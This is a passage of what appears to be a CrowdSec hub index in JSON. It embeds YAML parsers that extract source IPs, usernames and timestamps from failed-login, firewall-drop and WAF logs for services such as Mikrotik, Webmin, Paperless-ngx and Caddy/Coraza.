statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: username\n            expression: evt.Parsed.username\n      - filter: \"evt.Parsed.message contains 'password mismatch'\"\n        pattern_syntax:\n          PASSWORD_MISMATCH: 'user \"%{NO_DOUBLE_QUOTE:username}\": password mismatch'\n        grok:\n          pattern: '%{PASSWORD_MISMATCH}'\n          apply_on: message\n        statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: username\n            expression: evt.Parsed.username\n      - filter: \"evt.Parsed.message contains 'limiting requests, excess'\"\n        statics:\n          - meta: sub_type\n            value: \"req_limit_exceeded\"\n  ## Parse malformed requests\n  - grok:\n      pattern: '\\[%{HTTPDATE:time_local}\\] %{NPMPLUSFQDN:target_fqdn} %{IPORHOST:remote_addr} %{NUMBER:request_time} \"%{DATA:request}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} %{NUMBER:bytes_sent} %{DATA:http_referer} %{GREEDYDATA:http_user_agent}'\n      apply_on: message\n    statics:\n      - meta: log_type\n        value: http_access-log\n      - target: evt.StrTime\n        expression: evt.Parsed.time_local\n    # these ones apply for both grok patterns\nstatics:\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: http_status\n    expression: \"evt.Parsed.status\"\n  - meta: http_path\n    expression: \"evt.Parsed.request\"\n  - meta: http_verb\n    expression: \"evt.Parsed.verb\"\n  - meta: http_user_agent\n    expression: \"evt.Parsed.http_user_agent\"\n  - meta: target_fqdn\n    expression: \"evt.Parsed.target_fqdn\"\n", "description": "Parse NPMplus access and error logs", "path": "parsers/s01-parse/ZoeyVid/npmplus-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "f8d7c6e259f94d2ce34c6bdd0b9843a1bb52e395c7ba491d3832d3d0ad672103"}, "0.2": {"digest": "7f61ecc8eba7e6a73b74afdb6dc44f7103d97c4f4ff6695708f72121d76e2b46"}, "0.3": {"digest": "39d823dbc299c50ab73901ddf3010ac67a7ab5ff17baf5897e6eb9dbde4946ef"}}}, "a1ad/meshcentral-logs": {"content": "\nonsuccess: next_stage\n#debug: false\nname: a1ad/meshcentral-logs\ndescription: \"Parse meshcentral logs\"\nfilter: \"evt.Parsed.program == 'meshcentral'\"\npattern_syntax:\n  MESHCENTRAL_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\n  MESHCENTRAL_CUSTOMDATE: \"%{MONTH} %{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND}\"\nnodes:\n  - grok:\n      pattern: '%{MESHCENTRAL_CUSTOMDATE:timestamp}.*Failed password for %{MESHCENTRAL_CUSTOMUSER:username} from %{IP:source_ip}.*'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: meshcentral_failed_auth\n\nstatics:\n    - meta: service\n      value: meshcentral\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n", "description": "Parse meshcentral logs", "path": "parsers/s01-parse/a1ad/meshcentral-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "5d0d9069a3e8872106d88c3b7bbefc61817dceea197b41eb5e29e149c9100f26"}, "0.2": {"digest": "3d89097772e8fd781deeb6695f2cb69242e0b8cdc3e9dad575fb47d075fe3b1e"}}}, "a1ad/mikrotik-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'mikrotik'\"\nname: a1ad/mikrotik-logs\ndescription: \"Parse Mikrotik logs\"\npattern_syntax:\n  MIKROTIK_FIREWALL_DROP: \"%{TIMESTAMP_ISO8601:timestamp} %{HOSTNAME} .* %{DATA:tag} input: in:%{DATA:if_in} out:%{DATA:if_out}, connection-state:%{DATA:connection_state} src-mac %{MAC:src_mac}, proto %{WORD:proto}.*, %{IP:source_ip}:%{INT:src_port}->%{IP:dst_ip}:%{INT:dst_port}, len %{INT:length}\"\n  MIKROTIK_AUTH_FAILED: \"%{TIMESTAMP_ISO8601:timestamp} %{HOSTNAME} .* login failure for user %{USERNAME:invalid_user} from %{IP:source_ip}\"\nnodes:\n  - grok:\n     name: \"MIKROTIK_FIREWALL_DROP\"\n     apply_on: message\n    statics:\n      - meta: service\n        value: tcp_udp\n      - meta: log_type\n        value: mikrotik_drop\n      - meta: dst_port\n        expression: \"evt.Parsed.dst_port\"\n  - grok:\n     name : \"MIKROTIK_AUTH_FAILED\"\n     apply_on: message\n    statics:\n      - meta: service\n        value: mikrotik\n      - meta: log_type\n        value: mikrotik_failed_auth\n      - meta: user\n        expression: \"evt.Parsed.invalid_user\"\nstatics:\n - meta: source_ip\n   expression: \"evt.Parsed.source_ip\"\n - target: evt.StrTime\n   expression: evt.Parsed.timestamp\n", "description": "Parse Mikrotik logs", "path": "parsers/s01-parse/a1ad/mikrotik-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "f93eb0de9904b9b1ef035f5fa74ae3fdd68516de1a28c2e7c00d14afc76d86e8"}, "0.2": {"digest": "f837ac29caf28ee1e273f118fd4a0f9be6e71fa7f8b30983f7ee091cbb82740e"}}}, "aderumier/proxmox-iptables-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.message contains 'PVEFW-reject' or evt.Parsed.message contains 'DROP' or evt.Parsed.message contains 'REJECT'\"\ndebug: false\nname: aderumier/proxmox-iptables-logs\ndescription: \"Parse proxmox iptables drop logs\"\ngrok:\n  pattern: \"^%{NOTSPACE:vmid} %{NOTSPACE:loglevel} %{NOTSPACE:int_eth}-IN %{HTTPDATE:logdate} (policy )?%{NOTSPACE:action}:( IN=%{DATA:iface})?( OUT=%{DATA:oface})?( PHYSIN=%{DATA:physin})?( PHYSOUT=%{DATA:physout})?( MAC=%{MAC:dst_mac}:%{MAC}%{NOTSPACE})? SRC=%{IP:src_ip} DST=%{IP:dst_ip} LEN=%{INT:data_length}( TOS=0x%{BASE16NUM:tos})?( PREC=0x%{BASE16NUM:prec})?( TC=%{INT})?( FLOWLBL=%{INT})?( HOPLIMIT=%{INT:ttl})?( TTL=%{INT:ttl})?( ID=%{INT:id})?( %{WORD})? PROTO=%{NOTSPACE:proto}( SPT=%{INT:src_port})?( DPT=%{INT:dst_port})?( LEN=%{INT:data_length})?( SEQ=%{INT})?( ACK=%{INT:ack})?( WINDOW=%{INT})?( %{WORD:tcp_flags})?\"\n  apply_on: message\nstatics:\n    - meta: service\n      value: tcp\n    - meta: log_type\n      value: iptables_drop\n    - meta: source_ip\n      expression: \"evt.Parsed.src_ip\"\n", "description": "Parse proxmox iptables drop logs", "path": "parsers/s01-parse/aderumier/proxmox-iptables-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "c0c3a2300829f3172cd2b850ed3c21fcc27765a587b31ebad8c1223c06cc647f"}}}, "aidalinfo/couchdb-logs": {"content": "# debug: true\nfilter: \"evt.Parsed.program == 'couchdb'\"\nname: aidalinfo/couchdb-log-node\ndescription: \"First step get IP, User, time and IP from couchdb logs\"\nnodes:\n  - grok:\n      pattern: '\\[notice\\] %{TIMESTAMP_ISO8601:timestamp} %{GREEDYDATA} %{IP:source_ip} %{WORD:user} %{WORD:http_method} %{URIPATHPARAM:request} %{NUMBER:http_status_code}'\n      apply_on: message\n      statics:\n        - meta: stage_log\n          value: root-done\n        - meta: target_user\n          expression: \"evt.Parsed.user\"\n        - meta: source_ip\n          expression: \"evt.Parsed.source_ip\"\n        - target: evt.StrTime\n          expression: evt.Parsed.timestamp\n        - meta: path_db\n          expression: evt.Parsed.request\n---\nonsuccess: next_stage\nfilter: \"evt.Meta.stage_log == 'root-done'\"\nname: aidalinfo/couchdb-log-subnode\ndescription: \"Second step sort if is bruteforce or crawl\"\n# debug: true\nnodes:\n  - filter: \"evt.Parsed.http_status_code == '401'\"\n    debug: false\n    statics:\n      - meta: log_type\n        value: bf-enum-couchdb\n  - filter: \"evt.Parsed.http_status_code == '404'\"\n    debug: false\n    statics:\n      - meta: log_type\n        value: crawl-couchdb", "description": "First step get IP, User, time and IP from couchdb logs", "path": "parsers/s01-parse/aidalinfo/couchdb-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "cd9a26d6fd50e86a2c14942c5d82a5d83dca70fcc9e4505a7703a73e8f98455c"}}}, "aidalinfo/tcpudp-flood-traefik": {"content": "onsuccess: next_stage\n## Facilite le d\u00e9bogage\n## EN: Enable debugging\ndebug: false\n## Nom de la t\u00e2che\n## EN: Task name\nname: aidalinfo/tcpudp-flood-traefik\n## Description de la t\u00e2che\n## EN: Task description\ndescription: \"Parse TCP/UDP traefik logs\"\n## filtre du log \u00e0 traiter\n## EN: Log filter to process\nfilter: \"evt.Parsed.program == 'tcpudp-traefik'\"\n## Liste des n\u0153uds\n## EN: List of nodes\nnodes:\n## TCP GROK\n  - grok:\n  ## Grok pattern for extract IP SOURCE and other informations on this message structure\n      pattern: 'time=\"%{TIMESTAMP_ISO8601:time}\" level=%{LOGLEVEL:level} msg=\"Handling TCP connection from %{IP:source_ip}:%{NUMBER:source_port} to %{IP:destination_ip}:%{NUMBER:destination_port}\"'\n      ## Apply pattern on for all message in logs\n      apply_on: message\n      statics:\n      ## Add meta value, this type is used by scenario\n        - meta: log_type\n          value: traefik_tcpudp\n## UDP GROK pattern for extract IP SOURCE and other informations on this message structure\n  - grok:\n      pattern: 'time=\"%{TIMESTAMP_ISO8601:time}\" level=%{LOGLEVEL:level} msg=\"Handling UDP stream from %{IP:source_ip}:%{NUMBER:source_port} to %{IP:destination_ip}:%{NUMBER:destination_port}\"'\n     ## Apply pattern on for all message in logs\n      apply_on: message\n      statics:\n      ## Add meta value, this type is used by scenario\n        - meta: log_type\n          value: traefik_tcpudp\nstatics:\n## Pass Time and Source IP to other stages and scenarios.\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.time\n", "description": "Parse TCP/UDP traefik logs", "path": "parsers/s01-parse/aidalinfo/tcpudp-flood-traefik.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "13b543d2cdbd39fa04ff4988825566c06006e9ecc789d23e0e56ec399feddc87"}}}, "andreasbrett/baikal-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'BAIKAL'\"\nname: andreasbrett/baikal-logs\ndescription: \"Parse baikal logs\"\npattern_syntax:\n    BAIKAL_FAILED_AUTH: '\\[%{HTTPDERROR_DATE:timestamp}\\].*\\[client %{IP:source_ip}:%{INT:source_port}\\] AH01071: Got error ''PHP message: user %{USERNAME:username} authentication failure for Baikal'''\n    BAIKAL_FAILED_AUTH_NO_USER: '\\[%{HTTPDERROR_DATE:timestamp}\\].*\\[client %{IP:source_ip}:%{INT:source_port}\\] AH01071: Got error ''PHP message: user \\(name stripped-out\\) authentication failure for Baikal'''\nnodes:\n    - grok:\n          pattern: \"%{BAIKAL_FAILED_AUTH}\"\n          apply_on: message\n          statics:\n              - meta: log_type\n                value: baikal_failed_auth\n              - meta: username\n                expression: evt.Parsed.username\n    - grok:\n          pattern: \"%{BAIKAL_FAILED_AUTH_NO_USER}\"\n          apply_on: message\n          statics:\n              - meta: log_type\n                value: baikal_failed_auth_no_user\n\nstatics:\n    - meta: service\n      value: baikal\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n", "description": "Parse baikal logs", "path": "parsers/s01-parse/andreasbrett/baikal-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "9272d4c7b7cb4367a5a3da506876b3d292f6b328f048772fe285fc16633c5a0d"}}}, "andreasbrett/paperless-ngx-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'PAPERLESS-NGX'\"\nname: andreasbrett/paperless-ngx-logs\ndescription: \"Parse paperless-ngx logs\"\npattern_syntax:\n    DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\n    PAPERLESS_NGX_USER: \"%{USERNAME}|%{EMAILADDRESS}\"\nnodes:\n    - grok:\n          # Paperless-ngx v1.14.0 to v1.16.5\n          pattern: '\\[%{DATE_YMD:date} %{TIME:time}\\] \\[INFO\\] \\[paperless\\.auth\\] Login failed for user `%{PAPERLESS_NGX_USER:username}` from (private )?IP `%{IP:source_ip}\\.`'\n          apply_on: message\n          statics:\n              - meta: log_type\n                value: paperless_ngx_failed_auth\n              - meta: username\n                expression: evt.Parsed.username\n    - grok:\n          # Paperless-ngx v1.16.6+\n          pattern: '\\[%{DATE_YMD:date} %{TIME:time}\\] \\[INFO\\] \\[paperless\\.auth\\] Login failed for user `%{PAPERLESS_NGX_USER:username}` from (private )?IP `%{IP:source_ip}`\\.'\n          apply_on: message\n          statics:\n              - meta: log_type\n                value: paperless_ngx_failed_auth\n              - meta: username\n                expression: evt.Parsed.username\n\nstatics:\n    - meta: service\n      value: paperless-ngx\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"\n", "description": "Parse paperless-ngx logs", "path": "parsers/s01-parse/andreasbrett/paperless-ngx-logs.yaml", "stage": "s01-parse", "version": "0.5", "versions": {"0.1": {"digest": "9e0192bcc89e1050c982852c611d23f4ca781c4c201a094f11a5a2f4055f47f6"}, "0.2": {"digest": "19dc9f87ca60b58d199a42a6901200d1cf538db0254773b303512cf66308f4a6"}, "0.3": {"digest": "85ecad2a725e827e4d340f312cf8419203264bf2092c7eaa5c78dac618d10cbd"}, "0.4": {"digest": "21d1dff2e2d42b5aa2c24e30f7d761d141afcc64706b3a24efbe5ddd528b605f"}, "0.5": {"digest": "b8c9eaf3783acbf71d2ee98d515dd9dbf97aa2d3c72a4f897d5425c2669d654a"}}}, "andreasbrett/webmin-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'WEBMIN'\"\nname: andreasbrett/webmin-logs\ndescription: \"Parse webmin logs\"\npattern_syntax:\n    WEBMIN_AUTH_WRONG_PASS: '%{INT:unix_epoch}\\.%{INT}\\.%{INT} \\[.*\\] %{USERNAME:username} - %{IP:source_ip} global miniserv.pl \"failed\" \"-\" \"wrongpass\"'\n    WEBMIN_AUTH_TWOFACTOR: '%{INT:unix_epoch}\\.%{INT}\\.%{INT} \\[.*\\] %{USERNAME:username} - %{IP:source_ip} global miniserv.pl \"failed\" \"-\" \"twofactor\"'\n\nnodes:\n    - grok:\n          pattern: \"%{WEBMIN_AUTH_WRONG_PASS}\"\n          apply_on: message\n          statics:\n              - meta: log_type\n                value: webmin_failed_auth_wrong_pass\n    - grok:\n          pattern: \"%{WEBMIN_AUTH_TWOFACTOR}\"\n          apply_on: message\n          statics:\n              - meta: log_type\n                value: webmin_failed_auth_twofactor\n\nstatics:\n    - meta: service\n      value: webmin\n    - meta: username\n      expression: evt.Parsed.username\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.unix_epoch\"\n", "description": "Parse webmin logs", "path": "parsers/s01-parse/andreasbrett/webmin-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "32f1e1ac638422ad152f59e627818970547e548a2496db78cea2da71f30391e4"}, "0.2": {"digest": "604b0334eb171e626fcff15367bf291329291296572cf14ea30b7ca6bc8486de"}}}, "barnoux/caddy-coraza": {"content": "filter: \"evt.Parsed.program startsWith 'caddy'\"\nonsuccess: next_stage\nname: barnoux/caddy-coraza\ndescription: \"Parse coraza, logs from the web server caddy\"  \npattern_syntax:\n  MODSECCADDYPREFIX: \"\\\\[client \\\\\\\\\\\"%{IP:client}\\\\\\\\\\\"\\\\] Coraza: %{GREEDYDATA:modsecmessage}\"\n  MODSECCADDYFILE: \"\\\\[file \\\\\\\\\\\"%{DATA:rulefile}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYLINE: \"\\\\[line \\\\\\\\\\\"%{DATA:ruleline}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYOFFSET: \"\\\\[offset \\\\\\\\\\\"%{DATA:matchoffset}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYID: \"\\\\[id \\\\\\\\\\\"%{DATA:ruleid}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYREV: \"\\\\[rev \\\\\\\\\\\"%{DATA:rulerev}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYMSG: \"\\\\[msg \\\\\\\\\\\"%{DATA:rulemessage}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYDATA: \"\\\\[data \\\\\\\\\\\"%{DATA:ruledata}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYSEVERITY: \"\\\\[severity \\\\\\\\\\\"%{DATA:ruleseverity}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYMATURITY: \"\\\\[maturity \\\\\\\\\\\"%{DATA:maturity}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYACCURACY: \"\\\\[accuracy \\\\\\\\\\\"%{DATA:accuracy}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYVERS: \"\\\\[ver \\\\\\\\\\\"%{DATA:version}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYTAGS: \"(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag0}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\\\\\"%{DATA:ruletag1}\\\\\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag2}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag3}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag4}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag5}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag6}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag7}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag8}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA:ruletag9}\\\\\\\\\\\"\\\\] )?(?:\\\\[tag \\\\\\\\\\\"%{DATA}\\\\\\\\\\\"\\\\] )*\"\n  MODSECCADDYHOSTNAME: \"\\\\[hostname \\\\\\\\['\\\\\\\"]%{DATA:targethost}\\\\\\\\[\\\\\\\"']\\\\]\"\n  MODSECCADDYURI: \"\\\\[uri \\\\\\\\[\\\\\\\"']%{DATA:targeturi}\\\\\\\\[\\\\\\\"']\\\\]\"\n  MODSECCADDYUID: \"\\\\[unique_id \\\\\\\\\\\"%{DATA:uniqueid}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYREF: \"\\\\[ref \\\\\\\\\\\"%{DATA:ref}\\\\\\\\\\\"\\\\]\"\n  MODSECCADDYERROR: \"%{MODSECCADDYPREFIX} %{MODSECCADDYFILE} %{MODSECCADDYLINE} (?:%{MODSECCADDYOFFSET} )?(?:%{MODSECCADDYID} )?(?:%{MODSECCADDYREV} )?(?:%{MODSECCADDYMSG} )?(?:%{MODSECCADDYDATA} )?(?:%{MODSECCADDYSEVERITY} )?(?:%{MODSECCADDYVERS} )?(?:%{MODSECCADDYMATURITY} )?(?:%{MODSECCADDYACCURACY} )?%{MODSECCADDYTAGS}%{MODSECCADDYHOSTNAME} %{MODSECCADDYURI} %{MODSECCADDYUID}\"\nnodes:\n  - grok:\n      name: MODSECCADDYERROR\n      apply_on: Line.Raw\n      statics:\n        - meta: log_type\n          value: modsecurity\n        - meta: rule_id\n          expression: evt.Parsed.ruleid\n        - meta: modsec_ruledata\n          expression: evt.Parsed.ruledata\n        - meta: modsec_message\n          expression: evt.Parsed.rulemessage\n        - meta: rule_id\n          expression: evt.Parsed.ruleid\n        - meta: source_ip\n          expression: evt.Parsed.client\nstatics:\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Parsed.message, 'ts')\n\n", "description": "Parse coraza, logs from the web server caddy", "path": "parsers/s01-parse/barnoux/caddy-coraza.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "4fdf2cc8ece326da67e873bc1d9c5793cbdd31fd772ae0b610200dce1092b377"}}}, "baudneo/gotify-logs": {"content": "#filter: '1 == 1'  # For hub tests\nfilter: evt.Parsed.program == \"gotify\"  # Production\n#debug: true\nonsuccess: next_stage\nname: baudneo/gotify-logs\ndescription: parser for Gotify server\npattern_syntax:\n  GOTIFY_SEPERATOR: '%{SPACE}\\|%{SPACE}'\n  GOTIFY_401: '^\\[GIN\\]\\s*%{YEAR:year}/%{MONTHNUM:month}/%{NUMBER:day}%{SPACE}[-]%{SPACE}%{TIME:time}%{GOTIFY_SEPERATOR}401%{GOTIFY_SEPERATOR}%{DATA:request_time_took}%{GOTIFY_SEPERATOR}%{IP:source_ip}%{GOTIFY_SEPERATOR}%{WORD:request_type}%{SPACE}\"%{DATA:endpoint}\"'\nnodes:\n  - grok:\n      name: \"GOTIFY_401\"\n      apply_on: message\n      statics:\n        - target: StrTime\n          expression: |-\n            evt.Parsed.year+ \"/\" + evt.Parsed.month + \"/\" + evt.Parsed.day + \" \" + evt.Parsed.time\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:timestamp}%{GOTIFY_SEPERATOR}401%{GOTIFY_SEPERATOR}%{DATA:request_time_took}%{GOTIFY_SEPERATOR}%{IP:source_ip}%{GOTIFY_SEPERATOR}%{WORD:request_type}%{SPACE}\"%{DATA:endpoint}\"'\n      apply_on: message\n      statics:\n        - target: StrTime\n          expression: evt.Parsed.timestamp\nstatics:\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: log_type\n    value: gotify_failed_auth\n", "description": "parser for Gotify server", "path": "parsers/s01-parse/baudneo/gotify-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "526d78255dcba17af4ee78e969241dfdcf00fe1efee8d4498e4875ec2db9d0b8"}, "0.2": {"digest": "918275f986bbd2fd2a5a7b4fd16056a8447d6a95bd076fd698535fcc0d086b3b"}}}, "baudneo/zoneminder-logs": {"content": "#filter: '1==1'     # Testing\nfilter: evt.Parsed.program == \"zoneminder\"   # Production\n#debug: true\nonsuccess: next_stage\nname: baudneo/zoneminder-logs\ndescription: A parser for zoneminder web_php.log (Logins to DB/Web), now supports default PHP intl date format\npattern_syntax:\n  ZM_TIME: '2[0123]|[01]?[0-9]:[0-5][0-9]:(?:[0-5]?[0-9]|60)\\s?(AM|PM [A-Z]{3})?\\.[0-9]{6}'\n  ZM_BADUSER: '^%{MONTHNUM:month}[/-]%{MONTHDAY:day}[/-]%{YEAR:year},?[- ]%{ZM_TIME:time} web_php\\[\\d+]\\.[A-Z]{3} \\[(%{IP:source_ip})\\]\\s\\[Could not retrieve user %{DATA:username} details\\]'\n  ZM_BADPASSWORD: '^%{MONTHNUM:month}[/-]%{MONTHDAY:day}[/-]%{YEAR:year},?[- ]%{ZM_TIME:time} web_php\\[\\d+]\\.[A-Z]{3} \\[(%{IP:source_ip})\\]\\s\\[Login denied for user \\\"%{DATA:username}\\\"\\]'\n##NEW BAD USER# 12/17/22, 10:31:29 PM MST.557710 web_php[254894].ERR [10.0.1.5] [Could not retrieve user aaaa details] at /usr/share/zoneminder/www/includes/auth.php line 395\n##NEW BAD PASS# 01/06/22, 10:31:29 PM MST.557710 web_php[688].ERR [99.1.1.1] [Login denied for user \"validuser\"] at /usr/share/zoneminder/www/includes/auth.php line 313\n##OLD BAD USER# 01/06/22 09:26:15.117434 web_php[258].ERR [99.1.1.1] [Could not retrieve user testuser details] at /usr/share/zoneminder/www/includes/auth.php line 313\n##OLD BAD PASS# 01/06/22 09:27:39.843338 web_php[688].ERR [99.1.1.1] [Login denied for user \"validuser\"] at /usr/share/zoneminder/www/includes/auth.php line 313\n\nnodes:\n  - grok:\n      name: \"ZM_BADPASSWORD\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: zm_failed_auth\n        - meta: log_subtype\n          value: zm_bad_password\n        - meta: username\n          expression: evt.Parsed.username\n  - grok:\n      name: \"ZM_BADUSER\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: zm_failed_auth\n        - meta: log_subtype\n          value: zm_bad_user\n        - meta: username\n          expression: evt.Parsed.username\n\nstatics:\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - target: StrTime\n    expression: |-\n      \"20\" + evt.Parsed.year + \"/\" + evt.Parsed.month + \"/\" + evt.Parsed.day + \" \" + evt.Parsed.time\n", "description": "A parser for zoneminder web_php.log (Logins to DB/Web), now supports default PHP intl date format", "path": "parsers/s01-parse/baudneo/zoneminder-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "f603455093722174960807241d0959bfbd485c089372e4770298a0a9cd219001"}, "0.2": {"digest": "150c13541d7664c6557199a47d877fdac7d1a8cf64ec812d4f8af032cbf73815"}}}, "bouddha-fr/opensearch-dashboard-logs": {"content": "name: bouddha-fr/opensearch-dashboard-logs\ndescription: \"Parse OpenSearch web interface logs for failed login attempts\"\nfilter: \"evt.Parsed.program == 'opensearch-dashboards' && UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, 'opensearch') in ['', nil]\"\nonsuccess: next_stage\nstatics:\n  - meta: service\n    value: opensearch\n  - meta: source_ip\n    expression: evt.Unmarshaled.opensearch.req.remoteAddress\n  - meta: log_type\n    expression: |\n        (\n          evt.Unmarshaled.opensearch.type == 'response' &&\n          evt.Unmarshaled.opensearch.method == 'post' &&\n          evt.Unmarshaled.opensearch.statusCode in [401, '401'] &&\n          evt.Unmarshaled.opensearch.req.url == '/auth/login?dataSourceId='\n        ) ? 'opensearch_failed_auth' : ''\n  - meta: timestamp\n    expression: evt.Unmarshaled.opensearch['@timestamp']\n  - meta: status_code\n    expression: evt.Unmarshaled.opensearch.statusCode\n  - meta: url\n    expression: evt.Unmarshaled.opensearch.req.url\n  - target: evt.StrTime\n    expression: evt.Unmarshaled.opensearch['@timestamp']\n", "description": "Parse OpenSearch web interface logs for failed login attempts", "path": "parsers/s01-parse/bouddha-fr/opensearch-dashboard-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "a4767b90d25f9de40d624c6501541b6a33357f1903d56eac57d8003f230d7ddd"}}}, "corvese/apache-guacamole-logs": {"content": "name: corvese/apache-guacamole-logs\ndescription: \"Parses Apache Guacamole logs\"\nfilter: \"evt.Parsed.program == 'apache-guacamole'\"\nonsuccess: next_stage\npattern_syntax:\n  GUAC_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\nnodes:\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:timestamp}.*Authentication attempt from \\[?%{IP:source_ip}.*for user \"%{GUAC_CUSTOMUSER:username}\" failed'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: apache-guacamole_failed_auth\n        - meta: target_user\n          expression: evt.Parsed.username\nstatics:\n    - meta: service\n      value: apache-guacamole\n    - meta: source_ip\n      expression: evt.Parsed.source_ip\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n", "description": "Parses Apache Guacamole logs", "path": "parsers/s01-parse/corvese/apache-guacamole-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "16e2b2205362d6ce2d83cce6a843194b5aea947891e5c7e72d006d4980c2d610"}, "0.2": {"digest": "ab8fb6d9a42ff874338e32fcf47a1de5cd56de81261624a91e264ab8a34f09b7"}}}, "crowdsecurity/actual-budget-whitelist": {"content": "name: crowdsecurity/actual-budget-whitelist\ndescription: \"Whitelist events from actual budget\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\nwhitelist:\n  reason: \"Actual Budget whitelist\"\n  expression:\n   - evt.Meta.http_status in ['200', '304'] && evt.Meta.http_verb == 'GET' && evt.Meta.http_path matches '^\\\\/data\\\\/migrations\\\\/([A-Za-z0-9\\\\-\\\\_]+)\\\\.sql$' # When loading database migrations\n", "description": "Whitelist events from actual budget", "path": "parsers/s02-enrich/crowdsecurity/actual-budget-whitelist.yaml", "stage": "s02-enrich", "version": "0.1", "versions": {"0.1": {"digest": "67b44a2fb8f5c6fcbe0df4381cf7859292c9e8fd709d43555564bc3d442ed5d8"}}}, "crowdsecurity/amavis-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/amavis-logs\ndescription: \"Parse amavis logs\"\nfilter: \"evt.Parsed.program == 'amavis'\"\npattern_syntax:\n  AMAVIS_MESSAGEID: \"Message-ID: <%{DATA:amavis_message-id}>\"\n  AMAVIS_SIZE: \"size: %{POSINT:amavis_size}\"\n  AMAVIS_TESTS: 'Tests: \\[%{DATA:amavis_tests}\\]'\n  AMAVIS_FROM: \"From: %{DATA:amavis_header_from}\"\n  AMAVIS_HITS: \"Hits: %{NUMBER:amavis_hits}\"\n  AMAVIS_QUARANTINE: \"quarantine: %{NOTSPACE:amavis_quarantine}\"\n  AMAVIS_SUBJECT: 'Subject: \"%{DATA:amavis_subject}\"'\n  AMAVIS_KV: \"((%{AMAVIS_MESSAGEID}|%{AMAVIS_SIZE}|%{AMAVIS_TESTS}|%{AMAVIS_FROM}|%{AMAVIS_HITS}|%{AMAVIS_QUARANTINE}|%{AMAVIS_SUBJECT}|%{DATA}), )*\"\n  AMAVIS: '\\(%{DATA:amavis_id}\\) 